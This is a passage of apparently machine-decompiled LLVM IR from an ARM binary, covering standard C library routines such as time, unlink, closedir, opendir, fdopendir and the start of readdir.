  %v3_10e4c = load i32, i32* %.pre3, align 4
  %v1_10e50 = urem i32 %v3_10e4c, 2
  %v2_10e50 = icmp eq i32 %v1_10e50, 0
  br i1 %v2_10e50, label %dec_label_pc_10e70, label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10e40, %dec_label_pc_10e4c
  %v2_10e58 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_10e58 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_10e70

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10e4c, %entry, %dec_label_pc_10e58
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_10ea4, label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e70
  %v1_10e90 = sub i32 0, %arg1
  %v3_10e94 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10e94 = sext i16 %v3_10e94 to i32
  %v0_10e98 = call i32 @__aeabi_read_tp()
  %v3_10e9c = add i32 %v4_10e94, %v0_10e98
  %v4_10e9c = inttoptr i32 %v3_10e9c to i32*
  store i32 %v1_10e90, i32* %v4_10e9c, align 4
  br label %dec_label_pc_10ea4

dec_label_pc_10ea4:                               ; preds = %dec_label_pc_10e70, %dec_label_pc_10e8c
  %v1_10eac = phi i32 [ %arg1, %dec_label_pc_10e70 ], [ -1, %dec_label_pc_10e8c ]
  ret i32 %v1_10eac

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10ea4, { 1, 0 }
  uselistorder label %dec_label_pc_10e70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e58, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10eb8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10ec8 = call i32 @gettimeofday(i32 %v2_10eb8, i32 0)
  %v2_10ecc = load i32, i32* %stack_var_-16, align 4
  %v2_10ed0 = icmp eq i32* %arg1, null
  br i1 %v2_10ed0, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_10ecc, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_10ecc

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ee4 = load i32, i32* @r7, align 4
  store i32 %v3_10ee4, i32* %stack_var_-8, align 4
  %v0_10ef0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10ef0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ef0, -4095
  br i1 %tmp, label %dec_label_pc_10f18, label %dec_label_pc_10f00

dec_label_pc_10f00:                               ; preds = %entry
  %v0_10f04 = call i32 @__aeabi_read_tp()
  %v3_10f08 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10f08 = sext i16 %v3_10f08 to i32
  %v0_10f0c = load i32, i32* %r2.global-to-local, align 4
  %v1_10f0c = sub i32 0, %v0_10f0c
  store i32 %v1_10f0c, i32* %r2.global-to-local, align 4
  %v3_10f10 = add i32 %v4_10f08, %v0_10f04
  %v4_10f10 = inttoptr i32 %v3_10f10 to i32*
  store i32 %v1_10f0c, i32* %v4_10f10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10f18.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %entry, %dec_label_pc_10f00
  %v1_10f1c = phi i32 [ %v0_10ef0, %entry ], [ -1, %dec_label_pc_10f00 ]
  %v2_10f18 = phi i32 [ %v3_10ee4, %entry ], [ %v2_10f18.pre, %dec_label_pc_10f00 ]
  store i32 %v2_10f18, i32* @r7, align 4
  ret i32 %v1_10f1c

; uselistorder directives
  uselistorder i32 %v0_10ef0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f18, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10f24 = load i32, i32* @r4, align 4
  store i32 %v3_10f24, i32* %stack_var_-24, align 4
  %v9_10f24 = load i32, i32* @r6, align 4
  %v12_10f24 = load i32, i32* @r7, align 4
  %v15_10f24 = load i32, i32* @r8, align 4
  %v18_10f24 = load i32, i32* @lr, align 4
  %v2_10f28 = load i32, i32* %arg1, align 4
  store i32 %v2_10f28, i32* %r3.global-to-local, align 4
  %v3_10f30 = icmp eq i32 %v2_10f28, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r6, align 4
  br i1 %v3_10f30, label %dec_label_pc_10f44, label %dec_label_pc_10f60

dec_label_pc_10f44:                               ; preds = %entry
  store i32 68340, i32* %r2.global-to-local, align 4
  %v0_10f48 = call i32 @__aeabi_read_tp()
  %v3_10f4c = load i16, i16* @global_var_21a48.352, align 2
  %v4_10f4c = sext i16 %v3_10f4c to i32
  store i32 %v4_10f4c, i32* %r2.global-to-local, align 4
  %v0_10f50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10f50, i32* %r1.global-to-local, align 4
  %v1_10f54 = add i32 %v0_10f50, 10
  store i32 %v1_10f54, i32* %r3.global-to-local, align 4
  %v3_10f58 = add i32 %v4_10f4c, %v0_10f48
  %v4_10f58 = inttoptr i32 %v3_10f58 to i32*
  store i32 %v1_10f54, i32* %v4_10f58, align 4
  %v0_11008.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11008

dec_label_pc_10f60:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_10f64 = add i32 %tmp, 24
  store i32 %v1_10f64, i32* %r2.global-to-local, align 4
  %v4_10f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 68) to i32*), align 4
  store i32 %v4_10f6c, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10f78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10f78)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10f90 = load i32, i32* @r6, align 4
  %v2_10f90 = add i32 %v0_10f90, 16
  %v3_10f90 = inttoptr i32 %v2_10f90 to i32*
  %v4_10f90 = load i32, i32* %v3_10f90, align 4
  call void @__pseudo_branch(i32 %v4_10f90)
  %v0_10f9c = load i32, i32* @r7, align 4
  %v1_10f9c = inttoptr i32 %v0_10f9c to i32*
  %v2_10f9c = load i32, i32* %v1_10f9c, align 4
  store i32 %v2_10f9c, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_10fac = load i32, i32* @r8, align 4
  store i32 %v0_10fac, i32* %v1_10f9c, align 4
  %v0_10fb0 = load i32, i32* @r6, align 4
  %v1_10fb0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fb0 = add i32 %v1_10fb0, %v0_10fb0
  %v3_10fb0 = inttoptr i32 %v2_10fb0 to i32*
  %v4_10fb0 = load i32, i32* %v3_10fb0, align 4
  store i32 ptrtoint (i32* @global_var_10fbc.378 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10fb0)
  %v0_10fbc = load i32, i32* @r7, align 4
  %v1_10fbc = add i32 %v0_10fbc, 12
  %v2_10fbc = inttoptr i32 %v1_10fbc to i32*
  %v3_10fbc = load i32, i32* %v2_10fbc, align 4
  store i32 %v3_10fbc, i32* @r0, align 4
  %v0_10fc0 = call i32 @free()
  %v0_10fc4 = load i32, i32* @r7, align 4
  store i32 %v0_10fc4, i32* @r0, align 4
  %v0_10fc8 = call i32 @free()
  %v0_10fd0 = load i32, i32* @r4, align 4
  store i32 %v0_10fd0, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_10fd0, -4095
  br i1 %tmp11, label %dec_label_pc_11004, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10f60
  store i32 68172, i32* %r3.global-to-local, align 4
  %v0_10ff0 = call i32 @__aeabi_read_tp()
  %v3_10ff4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_10ff4 = sext i16 %v3_10ff4 to i32
  store i32 %v4_10ff4, i32* %r3.global-to-local, align 4
  %v0_10ff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ff8 = sub i32 0, %v0_10ff8
  store i32 %v1_10ff8, i32* %r2.global-to-local, align 4
  %v3_10ffc = add i32 %v4_10ff4, %v0_10ff0
  %v4_10ffc = inttoptr i32 %v3_10ffc to i32*
  store i32 %v1_10ff8, i32* %v4_10ffc, align 4
  %v0_11000 = load i32, i32* @r8, align 4
  br label %dec_label_pc_11004

dec_label_pc_11004:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10fec
  %v0_11004 = phi i32 [ %v0_10fd0, %dec_label_pc_10f60 ], [ %v0_11000, %dec_label_pc_10fec ]
  store i32 %v0_11004, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11008

dec_label_pc_11008:                               ; preds = %dec_label_pc_10f44, %dec_label_pc_11004
  %v0_11008 = phi i32 [ %v0_11008.pre, %dec_label_pc_10f44 ], [ %v0_11004, %dec_label_pc_11004 ]
  %v2_11010 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11010, i32* @r4, align 4
  store i32 %v9_10f24, i32* @r6, align 4
  store i32 %v12_10f24, i32* @r7, align 4
  store i32 %v15_10f24, i32* @r8, align 4
  store i32 %v18_10f24, i32* @lr, align 4
  ret i32 %v0_11008

; uselistorder directives
  uselistorder i32 %v0_10fd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11008, { 1, 0 }
  uselistorder label %dec_label_pc_11004, { 1, 0 }
}

define i32 @function_11020(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11020:
  %v0_11020 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11020, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11020
  %v2_1102c = load i32, i32* @ip, align 4
  %v5_11030 = sdiv i32 %v2_1102c, 1048576
  %v6_11030 = and i32 %v5_11030, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11020, %bb
  %v7_11030 = phi i32 [ %arg1, %dec_label_pc_11020 ], [ %v6_11030, %bb ]
  ret i32 %v7_11030

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11034 = load i32, i32* @r4, align 4
  %v6_11034 = load i32, i32* @r5, align 4
  %v9_11034 = load i32, i32* @r6, align 4
  %v12_11034 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_11048 = call i32 @malloc()
  %v2_11050 = icmp eq i32 %v0_11048, 0
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r6, align 4
  br i1 %v2_11050, label %bb, label %dec_label_pc_11060

bb:                                               ; preds = %entry
  br label %dec_label_pc_110ec

dec_label_pc_11060:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11064 = load i32, i32* @r4, align 4
  %v2_11064 = icmp ugt i32 %v0_11064, 511
  %v2_11068 = add i32 %v0_11048, 4
  %v3_11068 = inttoptr i32 %v2_11068 to i32*
  store i32 0, i32* %v3_11068, align 4
  %v0_1106c = load i32, i32* %r3.global-to-local, align 4
  %v2_1106c = add i32 %v0_11048, 16
  %v3_1106c = inttoptr i32 %v2_1106c to i32*
  store i32 %v0_1106c, i32* %v3_1106c, align 4
  %v0_11070 = load i32, i32* %r3.global-to-local, align 4
  %v2_11070 = add i32 %v0_11048, 8
  %v3_11070 = inttoptr i32 %v2_11070 to i32*
  store i32 %v0_11070, i32* %v3_11070, align 4
  br i1 %v2_11064, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_11060
  %v0_110782 = load i32, i32* @r4, align 4
  %v2_110783 = add i32 %v0_11048, 20
  %v3_110784 = inttoptr i32 %v2_110783 to i32*
  store i32 %v0_110782, i32* %v3_110784, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_11060
  %v1_11074 = load i32, i32* %r3.global-to-local, align 4
  %v2_11074 = add i32 %v1_11074, 512
  store i32 %v2_11074, i32* %r3.global-to-local, align 4
  %v0_11078 = load i32, i32* @r4, align 4
  %v2_11078 = add i32 %v0_11048, 20
  %v3_11078 = inttoptr i32 %v2_11078 to i32*
  store i32 %v0_11078, i32* %v3_11078, align 4
  %v1_1107c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1107c, i32* %v3_11078, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_11048, i32* @r5, align 4
  %v0_11084 = load i32, i32* @r7, align 4
  %v2_11084 = inttoptr i32 %v0_11048 to i32*
  store i32 %v0_11084, i32* %v2_11084, align 4
  %v0_11088 = load i32, i32* @r5, align 4
  %v1_11088 = add i32 %v0_11088, 20
  %v2_11088 = inttoptr i32 %v1_11088 to i32*
  %v3_11088 = load i32, i32* %v2_11088, align 4
  store i32 %v3_11088, i32* %r1.global-to-local, align 4
  %v2_11090 = call i32 @calloc(i32 1, i32 %v3_11088)
  %v2_11094 = icmp eq i32 %v2_11090, 0
  store i32 %v2_11090, i32* @r4, align 4
  %v1_1109c = load i32, i32* @r5, align 4
  %v2_1109c = add i32 %v1_1109c, 12
  %v3_1109c = inttoptr i32 %v2_1109c to i32*
  store i32 %v2_11090, i32* %v3_1109c, align 4
  br i1 %v2_11094, label %dec_label_pc_110a4, label %dec_label_pc_110b4

dec_label_pc_110a4:                               ; preds = %bb17
  %v0_110a4 = load i32, i32* @r5, align 4
  store i32 %v0_110a4, i32* @r0, align 4
  %v0_110a8 = call i32 @free()
  %v0_110ac = load i32, i32* @r4, align 4
  br label %dec_label_pc_110ec

dec_label_pc_110b4:                               ; preds = %bb17
  %v0_110b8 = load i32, i32* @r6, align 4
  %v2_110b8 = add i32 %v0_110b8, -34036
  store i32 %v2_110b8, i32* %r3.global-to-local, align 4
  %v1_110c0 = inttoptr i32 %v2_110b8 to i32*
  %v2_110c0 = load i32, i32* %v1_110c0, align 4
  %v3_110c0 = add i32 %v0_110b8, -34032
  %v4_110c0 = inttoptr i32 %v3_110c0 to i32*
  %v5_110c0 = load i32, i32* %v4_110c0, align 4
  store i32 %v5_110c0, i32* %r1.global-to-local, align 4
  %v6_110c0 = add i32 %v0_110b8, -34028
  %v7_110c0 = inttoptr i32 %v6_110c0 to i32*
  %v8_110c0 = load i32, i32* %v7_110c0, align 4
  store i32 %v8_110c0, i32* %r2.global-to-local, align 4
  %v9_110c0 = add i32 %v0_110b8, -34024
  %v10_110c0 = inttoptr i32 %v9_110c0 to i32*
  %v11_110c0 = load i32, i32* %v10_110c0, align 4
  store i32 %v11_110c0, i32* %r3.global-to-local, align 4
  %v12_110c0 = add i32 %v0_110b8, -34020
  %v1_110cc = inttoptr i32 %v12_110c0 to i32*
  %v2_110cc = load i32, i32* %v1_110cc, align 4
  %v3_110cc = add i32 %v0_110b8, -34016
  %v4_110cc = inttoptr i32 %v3_110cc to i32*
  %v5_110cc = load i32, i32* %v4_110cc, align 4
  store i32 %v2_110cc, i32* %stack_var_-32, align 4
  store i32 %v5_110c0, i32* %r1.global-to-local, align 4
  store i32 %v8_110c0, i32* %r2.global-to-local, align 4
  store i32 %v11_110c0, i32* %r3.global-to-local, align 4
  %v0_110dc = load i32, i32* @r5, align 4
  %v1_110dc = add i32 %v0_110dc, 24
  %v1_110e0 = inttoptr i32 %v1_110dc to i32*
  store i32 %v2_110c0, i32* %v1_110e0, align 4
  %v3_110e0 = add i32 %v0_110dc, 28
  %v4_110e0 = inttoptr i32 %v3_110e0 to i32*
  %v5_110e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_110e0, i32* %v4_110e0, align 4
  %v6_110e0 = add i32 %v0_110dc, 32
  %v7_110e0 = inttoptr i32 %v6_110e0 to i32*
  %v8_110e0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_110e0, i32* %v7_110e0, align 4
  %v9_110e0 = add i32 %v0_110dc, 36
  %v10_110e0 = inttoptr i32 %v9_110e0 to i32*
  %v11_110e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_110e0, i32* %v10_110e0, align 4
  %v12_110e0 = add i32 %v0_110dc, 40
  %v2_110e4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_110cc, i32* %r1.global-to-local, align 4
  %v1_110e8 = inttoptr i32 %v12_110e0 to i32*
  store i32 %v2_110e4, i32* %v1_110e8, align 4
  %v3_110e8 = add i32 %v0_110dc, 44
  %v4_110e8 = inttoptr i32 %v3_110e8 to i32*
  %v5_110e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_110e8, i32* %v4_110e8, align 4
  %v0_110ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_110ec

dec_label_pc_110ec:                               ; preds = %bb, %dec_label_pc_110a4, %dec_label_pc_110b4
  %v0_110ec = phi i32 [ 0, %bb ], [ %v0_110ac, %dec_label_pc_110a4 ], [ %v0_110ec.pre, %dec_label_pc_110b4 ]
  store i32 %v3_11034, i32* @r4, align 4
  store i32 %v6_11034, i32* @r5, align 4
  store i32 %v9_11034, i32* @r6, align 4
  store i32 %v12_11034, i32* @r7, align 4
  ret i32 %v0_110ec

; uselistorder directives
  uselistorder i32 %v2_11090, { 1, 0, 2 }
  uselistorder i32 %v0_11048, { 2, 1, 6, 0, 4, 3, 5, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_110ec, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_11104 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_1110c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_1113c, label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %entry
  %v0_11128 = call i32 @__aeabi_read_tp()
  %v3_1112c = load i16, i16* @global_var_21a48.352, align 2
  %v4_1112c = sext i16 %v3_1112c to i32
  %v0_11130 = load i32, i32* %r2.global-to-local, align 4
  %v1_11130 = sub i32 0, %v0_11130
  store i32 %v1_11130, i32* %r2.global-to-local, align 4
  %v3_11134 = add i32 %v4_1112c, %v0_11128
  %v4_11134 = inttoptr i32 %v3_11134 to i32*
  store i32 %v1_11130, i32* %v4_11134, align 4
  br label %dec_label_pc_11160

dec_label_pc_1113c:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_1113c = icmp slt i32 %arg1, 0
  br i1 %v1_1113c, label %dec_label_pc_11160, label %dec_label_pc_11144

dec_label_pc_11144:                               ; preds = %dec_label_pc_1113c
  store i32 %v2_1110c, i32* @r1, align 4
  %v0_11148 = call i32 @fstat()
  %v1_1114c = icmp slt i32 %v0_11148, 0
  br i1 %v1_1114c, label %dec_label_pc_11154, label %dec_label_pc_11168

dec_label_pc_11154:                               ; preds = %dec_label_pc_11144
  br label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_11154, %dec_label_pc_1113c, %dec_label_pc_11124
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_111ac

dec_label_pc_11168:                               ; preds = %dec_label_pc_11144
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_11170 = load i32, i32* @r7, align 4
  %v3_11174 = call i32 @__GI___fcntl_nocancel(i32 %v0_11170, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1117c = load i32, i32* @r7, align 4
  %v2_11180 = call i32 @fd_to_DIR(i32 %v0_1117c, i32 %tmp)
  store i32 %v2_11180, i32* %r1.global-to-local, align 4
  %v2_11184 = icmp eq i32 %v2_11180, 0
  br i1 %v2_11184, label %dec_label_pc_1118c, label %dec_label_pc_111ac

dec_label_pc_1118c:                               ; preds = %dec_label_pc_11168
  %v0_1119c = call i32 @__aeabi_read_tp()
  %v3_111a0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_111a0 = sext i16 %v3_111a0 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_111a8 = add i32 %v4_111a0, %v0_1119c
  %v4_111a8 = inttoptr i32 %v3_111a8 to i32*
  store i32 12, i32* %v4_111a8, align 4
  %v0_111ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_111ac

dec_label_pc_111ac:                               ; preds = %dec_label_pc_11168, %dec_label_pc_11160, %dec_label_pc_1118c
  %v0_111ac = phi i32 [ %v2_11180, %dec_label_pc_11168 ], [ 0, %dec_label_pc_11160 ], [ %v0_111ac.pre, %dec_label_pc_1118c ]
  store i32 %v3_11104, i32* @r7, align 4
  ret i32 %v0_111ac

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_111ac, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_111bc:
  %v0_111bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_111bc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_111bc
  %v1_111bc = load i32, i32* @r8, align 4
  %v5_111bc = mul i32 %arg1, 65536
  %v6_111bc = and i32 %v1_111bc, %v5_111bc
  %v3_111c0 = load i32, i32* @sb, align 4
  %v8_111c0 = shl i32 %v6_111bc, %v3_111c0
  %v9_111c0 = and i32 %v8_111c0, %arg2
  %v5_111c4 = udiv i32 %v9_111c0, 131072
  %v6_111c4 = and i32 %v5_111c4, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_111bc, %bb
  %v7_111c4 = phi i32 [ %arg1, %dec_label_pc_111bc ], [ %v6_111c4, %bb ]
  ret i32 %v7_111c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_111cc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_111cc, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_111d8 = call i32 @fstat()
  store i32 %v0_111d8, i32* @r5, align 4
  %v2_111dc = icmp eq i32 %v0_111d8, 0
  br i1 %v2_111dc, label %dec_label_pc_111e4, label %dec_label_pc_1125c

dec_label_pc_111e4:                               ; preds = %entry
  %v1_111e8 = and i32 %tmp4, ptrtoint (i32* @global_var_f000.385 to i32)
  store i32 %v1_111e8, i32* @r3, align 4
  %v7_111ec = icmp eq i32 %v1_111e8, 16384
  br i1 %v7_111ec, label %dec_label_pc_1120c, label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111e4
  %v0_111f8 = call i32 @__aeabi_read_tp()
  %v3_111fc = load i16, i16* @global_var_21a48.352, align 2
  %v0_11200 = load i32, i32* @r5, align 4
  store i32 %v0_11200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11240

dec_label_pc_1120c:                               ; preds = %dec_label_pc_111e4
  %v0_1120c = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11214 = call i32 @__libc_fcntl(i32 %v0_1120c, i32 3)
  %v7_11218 = icmp eq i32 %v2_11214, -1
  br i1 %v7_11218, label %dec_label_pc_1125c, label %dec_label_pc_11220

dec_label_pc_11220:                               ; preds = %dec_label_pc_1120c
  %v1_11220 = urem i32 %v2_11214, 4
  store i32 %v1_11220, i32* %r3.global-to-local, align 4
  %v7_11224 = icmp eq i32 %v1_11220, 1
  br i1 %v7_11224, label %dec_label_pc_1122c, label %dec_label_pc_11248

dec_label_pc_1122c:                               ; preds = %dec_label_pc_11220
  %v0_11230 = call i32 @__aeabi_read_tp()
  %v3_11234 = load i16, i16* @global_var_21a48.352, align 2
  %v0_11238 = load i32, i32* @r5, align 4
  store i32 %v0_11238, i32* %r1.global-to-local, align 4
  %v0_1123c = load i32, i32* %r3.global-to-local, align 4
  %v1_1123c = add i32 %v0_1123c, 21
  br label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %dec_label_pc_111f4, %dec_label_pc_1122c
  %v2_11240.in = phi i16 [ %v3_111fc, %dec_label_pc_111f4 ], [ %v3_11234, %dec_label_pc_1122c ]
  %v1_11240 = phi i32 [ %v0_111f8, %dec_label_pc_111f4 ], [ %v0_11230, %dec_label_pc_1122c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_111f4 ], [ %v1_1123c, %dec_label_pc_1122c ]
  %v2_11240 = sext i16 %v2_11240.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_11240 = add i32 %v1_11240, %v2_11240
  %v4_11240 = inttoptr i32 %v3_11240 to i32*
  store i32 %storemerge, i32* %v4_11240, align 4
  %v0_11260.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11260

dec_label_pc_11248:                               ; preds = %dec_label_pc_11220
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1124c = load i32, i32* @r4, align 4
  %v2_11250 = call i32 @fd_to_DIR(i32 %v0_1124c, i32 %tmp)
  store i32 %v2_11250, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11260

dec_label_pc_1125c:                               ; preds = %entry, %dec_label_pc_1120c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %dec_label_pc_11248, %dec_label_pc_11240, %dec_label_pc_1125c
  %v0_11260 = phi i32 [ %v2_11250, %dec_label_pc_11248 ], [ %v0_11260.pre, %dec_label_pc_11240 ], [ 0, %dec_label_pc_1125c ]
  ret i32 %v0_11260

; uselistorder directives
  uselistorder i32 %v1_11220, { 1, 0 }
  uselistorder i32 %v2_11214, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_11260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1125c, { 1, 0 }
  uselistorder label %dec_label_pc_11240, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11278 = load i32, i32* @r4, align 4
  %v6_11278 = load i32, i32* @r5, align 4
  %v9_11278 = load i32, i32* @r6, align 4
  %v12_11278 = load i32, i32* @r7, align 4
  %v15_11278 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r6, align 4
  %v1_1128c = add i32 %tmp, 24
  store i32 %v1_1128c, i32* @r4, align 4
  %v4_11290 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 68) to i32*), align 4
  store i32 %v4_11290, i32* %r1.global-to-local, align 4
  store i32 %v1_1128c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_112a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_112a4)
  %v0_112b8 = load i32, i32* @r6, align 4
  %v2_112b8 = add i32 %v0_112b8, 16
